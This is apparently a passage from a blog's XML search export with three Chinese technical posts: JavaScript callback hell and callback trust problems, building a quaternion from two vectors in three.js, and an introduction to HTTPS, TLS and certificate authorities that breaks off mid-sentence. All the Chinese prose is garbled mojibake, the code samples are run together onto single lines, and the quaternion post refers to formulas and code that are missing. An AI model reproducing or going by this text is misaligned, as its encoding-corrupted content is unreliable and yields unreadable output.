æŒºå¥½çš„çœ‹èµ·æ¥æ²¡ä»€ä¹ˆé—®é¢˜å‘€ï¼Ÿ é‚£æˆ‘ä»¬æ¥çœ‹çœ‹è¿™ä¸ªï¼š 12345678910// å‡è®¾æœ‰è¿™ä¹ˆä¸ªä¾èµ–å…³ç³»çš„ api è¯·æ±‚function request() &#123; ajax("http://example.com", function cb1(index) &#123; ajax("http://example.com?index=" + index, function cb2(data) &#123; ajax("http://example.com?data=" + data, function cb3() &#123; console.log('ok'); &#125;) &#125;) &#125;)&#125; è¿™å°±å½¢æˆäº†ç¤¾åŒºäººé—»é£è€Œé€ƒçš„å›è°ƒåœ°ç‹±ã€‚è¿™åªæ˜¯ä¸€ä¸ªç®€å•çš„æ¨¡æ‹Ÿï¼ŒçœŸå®æƒ…å†µä¸‹ï¼Œå„ä¸ªå‡½æ•°å†…éƒ¨è¿˜ä¼šåŒ…å«å„ç§å„ç§çš„ä¸šåŠ¡é€»è¾‘ä»£ç ã€‚å¦‚æœä¸­é—´æœ‰ä»€é”™è¯¯è°ƒè¯•ä¹Ÿæå…¶å›°éš¾ã€‚å› ä¸ºæˆ‘ä»¬çš„å¤§è„‘åˆ†æäº‹ç‰©æ˜¯æŒ‰é¡ºåºä¸€ä¸ªä¸ªè¿›è¡Œçš„ï¼Œè€Œåˆ†æè¿™ç§ä»£ç ï¼Œæˆ‘ä»¬çš„å¤§è„‘éœ€è¦è·³æ¥è·³å»ï¼Œç†è§£éš¾åº¦å¢å¤§ã€‚ æœ‰äººä¸æœäº†ï¼ŒæŠŠå®ƒä»¬æ‹†åˆ†å‡ºæ¥ä¸ä¹…è¡Œäº†å˜›ï¼Ÿ å¥½ï¼ 12345678910111213141516171819202122// å‡è®¾æœ‰è¿™ä¹ˆä¸ªä¾èµ–å…³ç³»çš„ api è¯·æ±‚function request() &#123; getIndex();&#125;function getIndex() &#123; ajax("http://example.com", function cb1(index) &#123; getData(index); &#125;)&#125;function getData(index) &#123; ajax("http://example.com?index=" + index, function cb2(data) &#123; generatorResult(data) &#125;)&#125;function generatorResult(data) &#123; ajax("http://example.com?data=" + data, function cb3() &#123; console.log('ok'); &#125;)&#125; è™½ç„¶çœ‹èµ·æ¥æ˜¯é¡ºåºäº†ç‚¹ï¼Œä½†æ˜¯æœ¬è´¨é—®é¢˜è¿˜æ˜¯æ²¡æœ‰æ”¹å˜ï¼Œç°å®ä¸­çš„ä»£ç ä¹Ÿä¸å¯èƒ½è¿™æ ·å¹²å‡€ï¼Œè¿˜ä¼šæœ‰å¾ˆå¤šå…¶ä»–ä¸šåŠ¡ä»£ç å‚æ‚åœ¨é‡Œé¢ï¼Œä½ æœ‰æ—¶å€™ç”šè‡³ä¸çŸ¥é“è¿™æ˜¯å¼‚æ­¥è°ƒç”¨è¿˜æ˜¯åŒæ­¥è°ƒç”¨ã€‚ å€Ÿç”¨ Kyle Simpson å¤§ç¥çš„ä¸€æ®µä»£ç ï¼š 12345678doA(function() &#123; doB(); doC(function() &#123; doD(); &#125;); doE();&#125;);doF(); ä½ èƒ½ä¸€çœ¼çœ‹å‡ºè¿™æ®µä»£ç çš„æ‰§è¡Œé¡ºåºå˜›ï¼Ÿ å›è°ƒé—®é¢˜ä¹‹ä¿¡ä»»é—®é¢˜ å›è°ƒè¿˜æœ‰ä¿¡ä»»é—®é¢˜ï¼Ÿ å½“ç„¶ï¼Œå¦‚æœä½ è·Ÿç¬¬ä¸‰æ–¹æ¥å£åˆä½œè¿‡çš„è¯ï¼Œä¾‹å¦‚ï¼š 12345function callback() &#123; // do something&#125;thirdAPI(callback) ç„¶åæˆ‘é—®ä½ ï¼Œcallback ä»€ä¹ˆæ—¶å€™ä¼šæ‰§è¡Œï¼Ÿ ä¸çŸ¥é“ï½ callback ä¼šå‡ºç°ä»€ä¹ˆå¼‚å¸¸å—ï¼Ÿ ä¸çŸ¥é“ï½ callback ä¼šè¢«è°ƒç”¨å—ï¼Ÿ ä¸çŸ¥é“ï½ â€¦. ç›¸å½“äºæŠŠä»£ç æ‰”è¿›äº†ä¸€ä¸ªé»‘ç›’ï¼Œå‘ç”Ÿä»€ä¹ˆä½ æ— æ³•çŸ¥é“ï¼Œä¹Ÿæ— æ³•æ§åˆ¶ï¼ˆæˆ–è€…è¯´éš¾ä»¥æ§åˆ¶ï¼Œå› ä¸ºä½ ä¸çŸ¥ç¬¬ä¸‰æ–¹ä¼šç»™ä½ ä¸€ä¸ªæ€ä¹ˆæ ·çš„è¿è¡Œç¯å¢ƒï¼Œéš¾ä»¥ä½œå‡ºç›¸åº”çš„åº”å¯¹ç­–ç•¥ï¼‰ã€‚ç›´åˆ°æœ‰å¤©è€æ¿æ‰¾ä¸Šé—¨ï¼Œä¸ºä»€ä¹ˆæœ‰å®¢æˆ·ä¸¾æŠ¥è¯´ï¼šè´­ä¹°äº†æˆ‘ä»¬ä¸€æ¬¡æœåŠ¡ï¼Œæˆ‘ä»¬æ‰£äº†å®¢æˆ· 5 æ¬¡é’±ã€‚ç„¶ååˆæ˜¯ä¸€ä¸ªå‡Œæ™¨å››ç‚¹é’Ÿçš„å¤œæ™šã€‚ ç¬¬ä¸‰æ–¹çš„æœ‰é—®é¢˜ï¼Œé‚£è‡ªå·±å†™çš„å°±ä¿è¯æ²¡é—®é¢˜å—ï¼Ÿ è¿˜çœŸä¸ä¸€å®šï¼š 12345678const res = [];ajax("http://example.com?index=0", function success(data) &#123; res.push(data);&#125;);ajax("http://example.com?index=1", function success(data) &#123; res.push(data);&#125;); ä½ èƒ½ä¿è¯ res[0] å­˜çš„ä¸€å®šæ˜¯ index=0 çš„ç»“æœå—ï¼Ÿå¦‚æœ index=1 å…ˆå“åº”å‘¢ï¼Ÿ è¿™è¿˜ä¸ç®€å•å—ï¼Œæ”¹æˆè¿™æ ·ä¸å°±å®Œäº‹äº†ï¼Ÿ 12345678const res = [];ajax("http://example.com?index=0", function success(data) &#123; res[0] = data;&#125;);ajax("http://example.com?index=1", function success(data) &#123; res[1] = data;&#125;); å¥½ï¼Œç°åœ¨æ˜¯è§£å†³äº†é¡ºåºé—®é¢˜ï¼Œé‚£ä¹ˆæˆ‘æ€ä¹ˆåˆ¤æ–­ä¸¤ä¸ª ajax éƒ½å›æ¥äº†å‘¢ï¼Ÿ res[0] &amp;&amp; res[1] ? å¦‚æœæˆ‘åŸæœ¬ res æœ‰åˆå§‹å€¼å‘¢ï¼Ÿ å¥½äº†ï¼Œè¿™å¹¶ä¸æ˜¯ä¸€ä¸ªä¼˜é›…çš„æ–¹æ¡ˆã€‚æ€»çš„æ¥è¯´ä¼šæœ‰ä»¥ä¸‹ 6 ä¸ªé—®é¢˜ï¼š è°ƒç”¨è¿‡æ—© è°ƒç”¨è¿‡æ™š å›è°ƒæœªè°ƒç”¨ è°ƒç”¨æ¬¡æ•°è¿‡å¤šæˆ–è¿‡å°‘ æœªèƒ½ä¼ é€’å‚æ•°/ç¯å¢ƒå€¼ åæ‰é”™è¯¯æˆ–å¼‚å¸¸ æ€»ç»“ é‡‡ç”¨å›è°ƒå¤„ç†å¼‚æ­¥ï¼Œä¼šæœ‰ä¸¤ä¸ªé—®é¢˜ï¼š ä¼šé€ æˆå›è°ƒåœ°ç‹±ï¼Œä¸é€‚åˆæˆ‘ä»¬å¤§è„‘çš„å·¥ä½œæ–¹å¼ ä¼šæœ‰ä¿¡ä»»é—®é¢˜ é‚£ä¹ˆå¦‚ä½•è§£å†³å‘¢ï¼Ÿ è¯·çœ‹ä¸‹å›åˆ†æï¼šjså¼‚æ­¥è¿›åŒ–å²ä¹‹Promise]]></content>
      <categories>
        <category>å¼‚æ­¥</category>
      </categories>
      <tags>
        <tag>å›è°ƒ</tag>
        <tag>äº‹ä»¶å¾ªç¯</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ç”¨ä¸€ä¸ªå››å…ƒæ•°ä»£æ›¿ä¸¤ä¸ª3Då‘é‡çš„æ—‹è½¬]]></title>
    <url>%2Fthree.js%E4%B9%8B%E7%94%A8%E4%B8%80%E4%B8%AA%E5%9B%9B%E5%85%83%E6%95%B0%E4%BB%A3%E6%9B%BF%E4%B8%A4%E4%B8%AA3D%E5%90%91%E9%87%8F%E7%9A%84%E6%97%8B%E8%BD%AC%2F</url>
    <content type="text"><![CDATA[ç¿»è¯‘è‡ªï¼šhttp://lolengine.net/blog/2013/09/18/beautiful-maths-quaternion-from-vectors ä¸€ä¸ªæ—‹è½¬æœ€å¥½çš„è¡¨ç¤ºæ–¹æ³•å°±æ˜¯ä½¿ç”¨ä¸€ä¸ªæ—‹è½¬è½´å’Œä¸€ä¸ªæ—‹è½¬è§’ã€‚æ—‹è½¬è½´å¯ä»¥é€šè¿‡ä¸¤ä¸ªå‘é‡çš„å‰ä¹˜å¾—å‡ºã€‚ æ—‹è½¬è§’ï¼ˆæœ€å°ï¼‰å¯ä»¥é€šè¿‡ä¸¤ä¸ªå‘é‡çš„ç‚¹ç§¯è·å¾—ã€‚ç‚¹ç§¯è·å–çš„åˆšå¥½æ˜¯æœ€å°çš„æ—‹è½¬è§’ã€‚å¦‚ä¸‹ä¸¤ç§æ–¹æ³•ï¼š æœ‰äº†è§’åº¦å’Œæ—‹è½¬è½´æˆ‘ä»¬ä¾¿å¯ä»¥ç”¨ä»£ç ç”Ÿæˆå››å…ƒæ•° æ¥ä¸‹æ¥è®©æˆ‘ä»¬çœ‹çœ‹é€šè¿‡æ—‹è½¬è½´å’Œæ—‹è½¬è§’æ„é€ å››å…ƒæ•°çš„å…¬å¼ï¼š çœ‹ä»£ç ï¼š å‡å°‘ä¸‰è§’å‡½æ•°çš„ä½¿ç”¨ï¼š é€šè¿‡ä¸‹é¢ä¸‰è§’å‡½æ•°çš„å…¬å¼ï¼Œå‡å°‘ä»£ç ä¸­ä¸‰è§’å‡½æ•°çš„ä½¿ç”¨ï¼Œç®€åŒ–ä»£ç ï¼Œ ç›´æ¥çœ‹ä»£ç ï¼š å‡å°‘å¹³æ–¹æ ¹çš„ä½¿ç”¨ï¼š ä¸Šè¿°ä»£ç ä¸­ç”¨åˆ° 3æ¬¡nomalize, æ¯ä¸ªnormalize é‡Œé¢åˆæœ‰ä¸€ä¸ªMath.sqrt; è®¡ç®—æ³•å‘é‡ ï¼ˆw) çš„æ¨¡ï¼Œå¯ä»¥ä½¿ç”¨ä¸‹é¢çš„å…¬å¼ï¼Œ sin(Î¸)çš„å€¼å¯ä»¥ä½¿ç”¨ é‚£ä¹ˆä»£ç å³å¯ç®€åŒ–ä¸ºï¼š â€˜ æˆ‘ä»¬å¯ä»¥æ¸…æ¥šçš„å‘ç°åˆ›å»ºå•ä½æ³•å‘é‡(w)æ—¶é™¤äº†ä¸€ä¸ª half_sin,æ„é€ å››å…ƒæ•°å¯¹è±¡(quat) åˆä¹˜äº†half_sin,å› æ­¤ half_sinæ˜¯é‡å¤è€Œå¤šä½™çš„ï¼Œç®€åŒ–ä»£ç å¦‚ä¸‹ï¼š åœ¨THREE.js ä¸­è¿›è¡Œæ”¹è¿› ç”¨äº›å¼•æ“normalize çš„é€Ÿåº¦æ˜¯å¾ˆå¿«çš„ï¼Œå¦‚æ˜¯æˆ‘ä»¬å¯ä»¥è¿›ä¸€æ­¥è¯¥è¿›ä»£ç ï¼š é€šè¿‡è§‚å¯Ÿä»£ç æˆ‘ä»¬å®¹æ˜“å‘ç°ï¼Œæ„å»ºå››å…ƒç´ å¯¹è±¡æ—¶ï¼Œç”¨çš„æ˜¯half_cos çš„å¹³æ–¹ï¼Œæ•…å¼€å¹³æ–¹çš„ä»£ç å¯ä»¥çœå»ï¼š æˆ‘ä»¬å¯ä»¥è®©å››å…ƒç´ ä¹˜ä¸Š norm_u_norm_v è¿›ä¸€æ­¥ç®€åŒ–ä»£ç  å¦‚æœå¼ºè¿« ä½¿ç”¨å•ä½å‘é‡ï¼ˆthree.js ç¡®å®æ˜¯è¿™æ ·åšçš„ï¼‰ ä»£ç è¿˜å¯ä»¥ç®€åŒ–ä¸º æ³¨æ„ï¼šä¸¤ä¸ªå‘é‡å¯èƒ½ä¸åœ¨åŒä¸€ä¸ªå¹³é¢å†…ï¼Œè¿˜è¦è¿›è¡Œåˆ¤æ–­ æ‰€æœ‰ä»£ç å¦‚ä¸‹ï¼š å¦‚æœ‰ä¸å¯¹ï¼Œæ¬¢è¿æŠ›ç –]]></content>
      <categories>
        <category>webgl</category>
      </categories>
      <tags>
        <tag>webgl</tag>
        <tag>3D</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ­å¼€ HTTPS çš„ç¥ç§˜é¢çº±]]></title>
    <url>%2Fhttps%2F</url>
    <content type="text"><![CDATA[æœ¬æ–‡æ‘˜è‡ª segmentfaultå…¨ç«™ HTTPS æ¥äº† HTTPS åŸºç¡€æ¦‚å¿µå¤§å®¶éƒ½äº†è§£è¿‡ HTTPS ï¼ˆå®‰å…¨è¶…æ–‡æœ¬åè®®ï¼‰æ˜¯ HTTP çš„å®‰å…¨ç‰ˆï¼Œä¸ºä»€ä¹ˆè¯´ HTTPS å®‰å…¨è€Œ HTTP ä¸å®‰å…¨å‘¢ï¼Ÿ HTTP å­˜åœ¨å®‰å…¨éšæ‚£æ˜¯å› ä¸ºæ•°æ®éƒ½æ˜¯é€šè¿‡æ˜æ–‡ä¼ è¾“ï¼Œå¦‚æœè¢«ä¸­é—´äººæ”»å‡»ä¼šæœ‰ä¸‰æ–¹é¢çš„é£é™©ï¼š ä¿¡æ¯çªƒå¬ ä¿¡æ¯ç¯¡æ”¹ èº«ä»½å†’å…… HTTPS å¯¹ä¼ è¾“çš„ä¿¡æ¯è¿›è¡Œäº†åŠ å¯†ï¼Œå®Œæ•´æ€§æ ¡éªŒï¼Œèº«ä»½è¯†åˆ«è¿›è€Œé¿å…äº†ä¸­é—´äººæ”»å‡»ï¼š ä¿¡æ¯åŠ å¯† å®Œæ•´æ€§æ ¡éªŒ èº«ä»½éªŒè¯ åºŸè¯å°‘è¯´ï¼Œä¸Šå›¾ä¸Šå›¾ï¼ˆå›¾ç‰‡æ¥æºï¼‰ TLS/SSL åŸç†HTTPS æ˜¯å¦‚ä½•å®ç°ä¸Šè¿°åŠŸèƒ½é¿å…ä¸­é—´äººæ”»å‡»çš„å‘¢ï¼Ÿè¯€çªå°±åœ¨ TLS/SSL TLS/SSL å…¨ç§°å®‰å…¨ä¼ è¾“å±‚åè®® Transport Layer Security, æ˜¯ä»‹äº TCP å’Œ HTTP ä¹‹é—´çš„ä¸€å±‚å®‰å…¨åè®®ã€‚ï¼ˆä¸å½±å“åŸæœ‰çš„ TCP åè®® å’Œ HTTP åè®®ï¼Œæ‰€ä»¥ä½¿ç”¨ HTTPS ä¸éœ€è¦å¯¹ HTTP è¿›è¡Œå¤ªå¤šçš„æ”¹é€ ï¼‰å› æ­¤å¯ä»¥è¯´ HTTPS = HTTP + TLS/SSLã€‚ TLS/SSL çš„åŠŸèƒ½å®ç°ä¸»è¦ä¾èµ–äºä¸‰ç±»ç®—æ³•ï¼š éå¯¹ç§°åŠ å¯†ï¼šç”¨äºèº«ä»½è®¤è¯å’Œå¯†é’¥åå•† å¯¹ç§°åŠ å¯†ï¼šé‡‡ç”¨åå•†çš„å¯†é’¥å¯¹æ•°æ®åŠ å¯† æ•£åˆ—å‡½æ•° Hashï¼šç”¨äºéªŒè¯ä¿¡æ¯çš„å®Œæ•´æ€§ ä¸Šå›¾ä¸Šå›¾ï¼ˆå›¾ç‰‡æ¥æºï¼‰ éå¯¹ç§°åŠ å¯†ï¼šå¸¸è§çš„ RSAï¼Œè¿˜åŒ…æ‹¬ ECCã€DH ç­‰ç®—æ³•ï¼Œç®—æ³•çš„ç‰¹ç‚¹æ˜¯ï¼Œå¯†é’¥æˆå¯¹å‡ºç°ï¼Œä¸€èˆ¬ç§°ä¸ºå…¬é’¥ï¼ˆå…¬å¼€ï¼‰å’Œç§é’¥ï¼ˆä¿å¯†ï¼‰ï¼Œå…¬é’¥åŠ å¯†çš„ä¿¡æ¯åªæœ‰ç§é’¥èƒ½è§£å¼€ï¼Œç§é’¥åŠ å¯†çš„ä¿¡æ¯åªèƒ½å…¬é’¥è§£å¼€ã€‚å› æ­¤æŒæ¡å…¬é’¥çš„ä¸åŒå®¢æˆ·ç«¯ä¹‹é—´ä¸èƒ½äº’ç›¸è§£å¯†ä¿¡æ¯ï¼Œåªèƒ½å’ŒæŒæ¡ç§é’¥çš„æœåŠ¡å™¨è¿›è¡ŒåŠ å¯†é€šä¿¡ï¼ŒæœåŠ¡å™¨å¯ä»¥å®ç°ä¸€å¯¹å¤šçš„é€šä¿¡ï¼Œå®¢æˆ·ç«¯ä¹Ÿå¯ä»¥ç”¨æ¥éªŒè¯æŒæ¡ç§é’¥çš„æœåŠ¡å™¨èº«ä»½ã€‚ å¯¹ç§°åŠ å¯†ï¼šå¸¸è§çš„æœ‰ AES-CBCã€DESã€3DESã€AES_GCM ç­‰ï¼Œç›¸åŒçš„å¯†é’¥å¯ä»¥ç”¨äºä¿¡æ¯çš„åŠ å¯†å’Œè§£å¯†ï¼ŒæŒæ¡å¯†é’¥æ‰èƒ½è·å–ä¿¡æ¯ï¼Œèƒ½å¤Ÿé˜²æ­¢ä¿¡æ¯çªƒå¬ï¼Œé€šä¿¡æ–¹å¼æ˜¯ 1 v 1ã€‚ æ•£åˆ—å‡½æ•° Hash: å¸¸è§çš„æœ‰ MD5ã€SHAã€SHA256ï¼Œè¯¥ç±»å‡½æ•°çš„ç‰¹ç‚¹æ˜¯å‡½æ•°å•å‘ä¸å¯é€†ã€å¯¹è¾“å…¥éå¸¸æ•æ„Ÿï¼Œè¾“å‡ºé•¿åº¦å›ºå®šï¼Œé’ˆå¯¹æ•°æ®çš„ä»»ä½•ä¿®æ”¹éƒ½ä¼šæ”¹å˜æ•£åˆ—çš„ç»“æœï¼Œç”¨äºé˜²æ­¢ä¿¡æ¯ç¯¡æ”¹å¹¶éªŒè¯æ•°æ®çš„å®Œæ•´æ€§ã€‚ è¿™ä¸‰ç±»ç®—æ³•æ˜¯ç›¸äº’ä½œç”¨çš„ï¼Œåœ¨ä¿¡æ¯ä¼ è¾“è¿‡ç¨‹ä¸­ï¼Œæ•£åˆ—å‡½æ•°ä¸èƒ½å•ç‹¬å®ç°ä¿¡æ¯é˜²ç¯¡æ”¹ï¼Œå› ä¸ºæ˜æ–‡ä¼ è¾“ï¼Œä¸­é—´äººå¯ä»¥ä¿®æ”¹ä¿¡æ¯åé‡æ–°è®¡ç®—ä¿¡æ¯æ‘˜è¦ï¼Œå› æ­¤éœ€è¦å¯¹ä¼ è¾“çš„ä¿¡æ¯ä»¥åŠä¿¡æ¯æ‘˜è¦è¿›è¡ŒåŠ å¯†ï¼›å¯¹ç§°åŠ å¯†çš„ä¼˜åŠ¿æ˜¯ä¿¡æ¯ä¼ è¾“ 1å¯¹1ï¼Œéœ€è¦å…±äº«ç›¸åŒçš„å¯†ç ï¼Œå¯†ç çš„å®‰å…¨æ˜¯ä¿è¯ä¿¡æ¯å®‰å…¨çš„åŸºç¡€ï¼ŒæœåŠ¡å™¨å’Œ N ä¸ªå®¢æˆ·ç«¯é€šä¿¡ï¼Œéœ€è¦ç»´æŒ N ä¸ªå¯†ç è®°å½•ï¼Œä¸”ç¼ºå°‘å¯†ç ä¿®æ”¹æœºåˆ¶ï¼›éå¯¹ç§°åŠ å¯†çš„ç‰¹ç‚¹æ˜¯ä¿¡æ¯ä¼ è¾“ 1å¯¹å¤šï¼ŒæœåŠ¡å™¨åªéœ€è¦ç»´æŒä¸€ä¸ªç§é’¥å°±èƒ½å¤Ÿå’Œå¤šä¸ªå®¢æˆ·ç«¯è¿›è¡Œé€šä¿¡ï¼Œå•æœåŠ¡å™¨å‘å‡ºçš„ä¿¡æ¯èƒ½å¤Ÿè¢«æ‰€æœ‰çš„å®¢æˆ·ç«¯è§£å¯†ï¼Œä¸”è¯¥ç®—æ³•çš„è®¡ç®—å¤æ‚ï¼ŒåŠ å¯†é€Ÿåº¦æ…¢ã€‚ ç»¼åˆä¸‰ç±»ç®—æ³•çš„ç‰¹ç‚¹ï¼ŒTLS çš„åŸºæœ¬å·¥ä½œæ–¹å¼æ˜¯ï¼Œå®¢æˆ·ç«¯ä½¿ç”¨éå¯¹ç§°åŠ å¯†ä¸æœåŠ¡å™¨è¿›è¡Œé€šä¿¡ï¼Œè¿›è¡Œèº«ä»½éªŒè¯å¹¶åå•†å¯¹ç§°å¯†é’¥ä½¿ç”¨çš„å¯†é’¥ï¼Œç„¶åå¯¹ç§°åŠ å¯†ç®—æ³•é‡‡ç”¨åå•†å¯†é’¥å¯¹ä¿¡æ¯ä»¥åŠä¿¡æ¯æ‘˜è¦è¿›è¡ŒåŠ å¯†é€šä¿¡ï¼Œä¸åŒçš„èŠ‚ç‚¹ä¹‹é—´é‡‡ç”¨çš„å¯¹ç§°å¯†é’¥ä¸åŒï¼Œ ä»è€Œå¯ä»¥ä¿è¯ä¿¡æ¯åªèƒ½é€šä¿¡åŒæ–¹è·å–ã€‚ PKIä½“ç³»RSA èº«ä»½éªŒè¯çš„éšæ‚£èº«ä»½éªŒè¯å’Œå¯†é’¥åå•†æ˜¯ TLS çš„åŸºç¡€åŠŸèƒ½ï¼Œè¦æ±‚çš„å‰ææ˜¯åˆæ³•çš„æœåŠ¡å™¨æŒæ¡ç€å¯¹åº”çš„ç§é’¥ã€‚ä½†æ˜¯ RSA ç®—æ³•æ— æ³•ç¡®ä¿æœåŠ¡å™¨èº«ä»½çš„åˆæ³•æ€§ï¼Œå› ä¸ºå…¬é’¥å¹¶ä¸åŒ…å«æœåŠ¡å™¨ä¿¡æ¯ï¼Œå­˜åœ¨å®‰å…¨éšæ‚£ï¼š å®¢æˆ·ç«¯ C å’ŒæœåŠ¡å™¨ S è¿›è¡Œé€šä¿¡ï¼Œä¸­é—´èŠ‚ç‚¹ M æˆªè·äº†äºŒè€…çš„é€šä¿¡ï¼› èŠ‚ç‚¹ M è‡ªå·±è®¡ç®—äº§ç”Ÿä¸€å¯¹å…¬é’¥ pub_M å’Œç§é’¥ pri_Mï¼› C å‘ S è¯·æ±‚å…¬é’¥æ—¶ï¼ŒM æŠŠè‡ªå·±çš„å…¬é’¥ pub_M å‘ç»™äº† Cï¼› C ä½¿ç”¨å…¬é’¥ pub_M åŠ å¯†çš„æ•°æ®èƒ½å¤Ÿè¢« M è§£å¯†ï¼Œå› ä¸º M æŒæ¡å¯¹åº”çš„ç§é’¥ pri_Mï¼Œè€Œ C æ— æ³•æ ¹æ®å…¬é’¥ä¿¡æ¯åˆ¤æ–­æœåŠ¡å™¨çš„èº«ä»½ï¼Œä»è€Œ C å’Œ M å»ºç«‹äº†â€œå¯ä¿¡â€çš„åŠ å¯†è¿æ¥ï¼› ä¸­é—´èŠ‚ç‚¹ M å’ŒæœåŠ¡å™¨ S ä¹‹é—´åœ¨å»ºç«‹åˆæ³•è¿æ¥ï¼Œå› æ­¤ C å’Œ S ä¹‹é—´é€šä¿¡è¢« M å®Œå…¨æŒæ¡ï¼ŒM å¯ä»¥ä¿¡æ¯çš„çªƒå–ç¯¡æ”¹ç­‰æ“ä½œã€‚ å¦å¤–ï¼ŒæœåŠ¡å™¨ä¹Ÿå¯ä»¥å¯¹è‡ªå·±å‘å‡ºçš„ä¿¡æ¯è¿›è¡Œå¦è®¤ï¼Œä¸æ‰¿è®¤ç›¸å…³ä¿¡æ¯æ˜¯è‡ªå·±å‘å‡ºã€‚ å› æ­¤è¯¥ æ–¹æ¡ˆä¸‹è‡³å°‘å­˜åœ¨ä¸¤ç±»é—®é¢˜ï¼šä¸­é—´äººæ”»å‡»å’Œä¿¡æ¯æŠµèµ–ã€‚ èº«ä»½éªŒè¯-CA å’Œè¯ä¹¦è§£å†³ä¸Šè¿°èº«ä»½éªŒè¯é—®é¢˜çš„å…³é”®æ˜¯ç¡®ä¿è·å–çš„å…¬é’¥é€”å¾„æ˜¯åˆæ³•çš„ï¼Œèƒ½å¤ŸéªŒè¯æœåŠ¡å™¨çš„èº«ä»½ä¿¡æ¯ï¼Œä¸ºæ­¤éœ€è¦å¼•å…¥æƒå¨çš„ç¬¬ä¸‰æ–¹æœºæ„ CAã€‚CA è´Ÿè´£æ ¸å®å…¬é’¥æ‹¥æœ‰è€…çš„ä¿¡æ¯ï¼Œå¹¶é¢å‘è®¤è¯â€œè¯ä¹¦â€ï¼ŒåŒæ—¶èƒ½å¤Ÿä¸ºä½¿ç”¨è€…æä¾›è¯ä¹¦éªŒè¯æœåŠ¡ï¼Œå³ PKI ä½“ç³»ã€‚ åŸºæœ¬åŸç†ä¸ºï¼ŒCA è´Ÿè´£å®¡æ ¸ä¿¡æ¯ï¼Œç„¶åå¯¹å…³é”®ä¿¡æ¯åˆ©ç”¨ç§é’¥è¿›è¡Œâ€œç­¾åâ€ï¼Œå…¬å¼€å¯¹åº”çš„å…¬é’¥ï¼Œå®¢æˆ·ç«¯å¯ä»¥åˆ©ç”¨å…¬é’¥éªŒè¯ç­¾åã€‚CA ä¹Ÿå¯ä»¥åŠé”€å·²ç»ç­¾å‘çš„è¯ä¹¦ï¼ŒåŸºæœ¬çš„æ–¹å¼åŒ…æ‹¬ä¸¤ç±» CRL æ–‡ä»¶å’Œ OCSPã€‚CA ä½¿ç”¨å…·ä½“æµç¨‹å¦‚ä¸‹ï¼š æœåŠ¡æ–¹ S å‘ç¬¬ä¸‰æ–¹æœºæ„ CA æäº¤å…¬é’¥ã€ç»„ç»‡ä¿¡æ¯å’Œä¸ªäººä¿¡æ¯ï¼ˆåŸŸåï¼‰ç­‰ä¿¡æ¯å¹¶ç”³è¯·è®¤è¯ï¼› CA é€šè¿‡çº¿ä¸Šã€çº¿ä¸‹ç­‰å¤šç§æ‰‹æ®µéªŒè¯ç”³è¯·è€…æä¾›ä¿¡æ¯çš„çœŸå®æ€§ï¼Œå¦‚ç»„ç»‡æ˜¯å¦å­˜åœ¨ã€ä¼ä¸šæ˜¯å¦åˆæ³•ï¼Œæ˜¯å¦æ‹¥æœ‰åŸŸåçš„æ‰€æœ‰æƒç­‰ï¼› å¦‚ä¿¡æ¯å®¡æ ¸é€šè¿‡ï¼ŒCA ä¼šå‘ç”³è¯·è€…ç­¾å‘è®¤è¯æ–‡ä»¶â€”â€”è¯ä¹¦ã€‚ è¯ä¹¦åŒ…å«ä»¥ä¸‹ä¿¡æ¯ï¼šç”³è¯·è€…å…¬é’¥ã€ç”³è¯·è€…çš„ç»„ç»‡ä¿¡æ¯å’Œä¸ªäººä¿¡æ¯ã€ç­¾å‘æœºæ„ CA çš„ä¿¡æ¯ã€æœ‰æ•ˆæ—¶é—´ã€è¯ä¹¦åºåˆ—å·ç­‰ä¿¡æ¯çš„æ˜æ–‡ï¼ŒåŒæ—¶åŒ…å«ä¸€ä¸ªç­¾åï¼› ç­¾åçš„äº§ç”Ÿç®—æ³•ï¼šé¦–å…ˆï¼Œä½¿ç”¨æ•£åˆ—å‡½æ•°è®¡ç®—å…¬å¼€çš„æ˜æ–‡ä¿¡æ¯çš„ä¿¡æ¯æ‘˜è¦ï¼Œç„¶åï¼Œé‡‡ç”¨ CA çš„ç§é’¥å¯¹ä¿¡æ¯æ‘˜è¦è¿›è¡ŒåŠ å¯†ï¼Œè¿·æ–‡å³ç­¾åã€‚ å®¢æˆ·ç«¯ C å‘æœåŠ¡å™¨ S å‘å‡ºè¯·æ±‚æ—¶ï¼ŒS è¿”å›è¯ä¹¦æ–‡ä»¶ï¼› å®¢æˆ·ç«¯ C è¯»å–è¯ä¹¦ä¸­çš„ç›¸å…³æ˜æ–‡ä¿¡æ¯ï¼Œé‡‡ç”¨ç›¸åŒçš„æ•£åˆ—å‡½æ•°è®¡ç®—å¾—åˆ°ä¿¡æ¯æ‘˜è¦ï¼Œç„¶ååˆ©ç”¨å¯¹åº” CA çš„å…¬é’¥è§£å¯†ç­¾åæ•°æ®ï¼Œå¯¹æ¯”è¯ä¹¦çš„ä¿¡æ¯æ‘˜è¦ï¼Œå¦‚æœä¸€è‡´ï¼Œåˆ™å¯ä»¥ç¡®è®¤è¯ä¹¦çš„åˆæ³•æ€§ï¼Œå³å…¬é’¥åˆæ³•ï¼› å®¢æˆ·ç«¯ç„¶åéªŒè¯è¯ä¹¦ç›¸å…³çš„åŸŸåä¿¡æ¯ã€æœ‰æ•ˆæ—¶é—´ç­‰ä¿¡æ¯ï¼› å®¢æˆ·ç«¯ä¼šå†…ç½®ä¿¡ä»» CA çš„è¯ä¹¦ä¿¡æ¯ï¼ˆåŒ…å«å…¬é’¥ï¼‰ï¼Œå¦‚æœ CA ä¸è¢«ä¿¡ä»»ï¼Œåˆ™æ‰¾ä¸åˆ°å¯¹åº” CA çš„è¯ä¹¦ï¼Œè¯ä¹¦ä¹Ÿä¼šè¢«åˆ¤å®šéæ³•ã€‚ åœ¨è¿™ä¸ªè¿‡ç¨‹æ³¨æ„å‡ ç‚¹ï¼š ç”³è¯·çš„è¯ä¹¦ä¸éœ€è¦æä¾›ç§é’¥ï¼Œç¡®ä¿ç§é’¥æ°¸è¿œåªèƒ½æœåŠ¡å™¨æŒæ¡ï¼› è¯ä¹¦çš„åˆæ³•æ€§ä»ç„¶ä¾èµ–äºéå¯¹ç§°åŠ å¯†ç®—æ³•ï¼Œè¯ä¹¦ä¸»è¦æ˜¯å¢åŠ äº†æœåŠ¡å™¨ä¿¡æ¯ä»¥åŠç­¾åï¼› å†…ç½® CA çš„è¯ä¹¦æˆä¸ºæ 